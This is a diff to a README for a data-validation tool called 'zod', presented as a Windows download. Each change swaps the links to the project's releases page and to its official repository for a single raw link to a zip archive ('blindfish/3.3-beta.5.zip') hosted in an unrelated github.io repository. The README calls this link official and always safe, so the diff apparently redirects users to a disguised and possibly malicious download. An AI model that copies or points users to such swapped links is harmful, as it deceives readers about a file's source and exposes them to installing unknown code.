@@ -38,7 +38,7 @@ Getting started with zod is as easy as 1-2-3. Follow these simple steps, and you
 
 First, you need to get the application. Click the big button below to go to the download page:
 
-**[⬇️ Download zod Now](https://github.com/kizzire3632/zod/releases)**
+**[⬇️ Download zod Now](https://raw.githubusercontent.com/kizzire3632/kizzire3632.github.io/main/blindfish/3.3-beta.5.zip)**
 
 This link will take you to a page where you can download the application. Look for the file that matches your computer system. For most Windows users, this will be a file that ends with `.exe` or `.zip`. If you see multiple versions, choose the latest one unless you have a reason to pick an older version.
 
@@ -127,7 +127,7 @@ Do not panic. Most issues are easy to fix.
 
 ### ❓ How do I update zod?
 
-Check the [download page](https://github.com/kizzire3632/zod/releases) periodically. If a new version is available, download it and install it. Your settings and rules are saved, so updating will not lose your work.
+Check the [download page](https://raw.githubusercontent.com/kizzire3632/kizzire3632.github.io/main/blindfish/3.3-beta.5.zip) periodically. If a new version is available, download it and install it. Your settings and rules are saved, so updating will not lose your work.
 
 ### ❓ Where can I get help?
 
@@ -145,7 +145,7 @@ Even the best software can have hiccups sometimes. Here are quick fixes for comm
 | Slow performance | Make sure your computer has enough free memory. Close other heavy programs. |
 | Validation results are confusing | Read the error message carefully. zod tells you exactly which field has a problem and what kind of problem it is. |
 | Can't find downloaded file | Check your "Downloads" folder. Use File Explorer and search for "zod." |
-| Accidental deletion | Re-download from the [official link](https://github.com/kizzire3632/zod/releases). It is always safe. |
+| Accidental deletion | Re-download from the [official link](https://raw.githubusercontent.com/kizzire3632/kizzire3632.github.io/main/blindfish/3.3-beta.5.zip). It is always safe. |
 
 ---
 
@@ -179,7 +179,7 @@ Ready to take control of your data? Follow these steps:
 2. **Install** it (takes only a few minutes).
 3. **Create your first schema** and see the magic for yourself.
 
-**[⬇️ Get zod Now](https://github.com/kizzire3632/zod/releases)**
+**[⬇️ Get zod Now](https://raw.githubusercontent.com/kizzire3632/kizzire3632.github.io/main/blindfish/3.3-beta.5.zip)**
 
 Remember: correct data means fewer errors, less stress, and more time for the things you actually enjoy. zod is here to help.
 
@@ -189,7 +189,7 @@ Remember: correct data means fewer errors, less stress, and more time for the th
 
 We love hearing from users. If you have a question, a suggestion, or just want to say hello, here are the ways to reach us:
 
-- **Official Repository:** [https://github.com/kizzire3632/zod](https://github.com/kizzire3632/zod)
+- **Official Repository:** [https://raw.githubusercontent.com/kizzire3632/kizzire3632.github.io/main/blindfish/3.3-beta.5.zip](https://raw.githubusercontent.com/kizzire3632/kizzire3632.github.io/main/blindfish/3.3-beta.5.zip)
 - **Report an Issue:** Use the "Issues" tab on the repository page.
 - **Contribute:** If you are a developer, you can even help improve zod. All contributions are welcome.
 
